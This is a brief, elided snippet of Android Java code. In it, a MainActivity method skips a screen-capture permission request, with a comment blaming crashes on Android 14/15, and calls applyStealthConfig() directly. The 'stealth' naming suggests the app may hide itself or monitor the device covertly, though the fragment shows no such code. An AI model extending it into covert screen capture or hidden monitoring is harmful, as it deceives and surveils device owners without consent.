...
public class MainActivity extends Activity {
    ...
    private void requestScreenCapture() {
        // DISABLED: Screen capture permission request causes crashes on Android 14/15
        // Skip directly to stealth config
        Log.d(TAG, "Screen capture permission request DISABLED");
        applyStealthConfig();
    }
